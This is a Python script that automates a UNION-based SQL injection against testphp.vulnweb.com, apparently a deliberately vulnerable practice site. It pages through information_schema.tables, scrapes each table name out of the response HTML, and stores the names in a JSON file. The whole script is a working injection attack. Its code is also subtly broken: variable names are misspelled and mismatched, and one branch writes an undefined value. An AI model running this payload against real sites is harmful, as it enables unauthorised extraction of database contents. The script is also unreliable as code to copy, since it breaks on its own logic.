import requests
from bs4 import BeautifulSoup
import json
import time
import os

target_url = "http://testphp.vulnweb.com/product.php?pic=0 union select 1,2,3,4,5,6,table_name,8,9,10,11 from information_schema.tables limit {},1"
limit_target = 86
limit = 1
data = []
file_nama = "./table_name.json"

if os.path.exists(file_nama) :
    with open(file_nama, "r") as file :
        list_data = json.load(file)
        list_index = list_data[-1]['id']
else :
    last_index = 0

for index in range(0, limit_target) :
    retry = 0
    success = False
    while retry < 3 and not success :
        url = target_url.format(index)
        reponse = requests.get(url)
        if reponse.status_code !=200:
            print(f"Requested failed with status code : {response.status_code}.Retrying...")
            retry += 1
            time.sleep(4)
            continue
        soup = BeautifulSoup(reponse.content,'html.parser')
        table_name_h = soup.find ('h2', id="pageName")
        if table_name_h :
            table_name_h = table_name_h.get_text(strip=True)
            data.append({
                'id' : index,
                'table_name' : table_name_h
            })
            success = True
            print (f"finish add {index}")
        else:
            print(f"Table name content not found for limit :{index}.Retrying...")
            retry += 1
            time.sleep(4)

if os.path.exists(file_nama) :
    with open(file_nama, "r") as file :
        list_data = json.load(file)
        list_data.extend(data)
else:
    last_index = data

with open(file_nama,"w") as file :
    json.dump(last_index,file,indent=4)
print(f"Scraping completed.Total item collection : {len(last_index)}") 
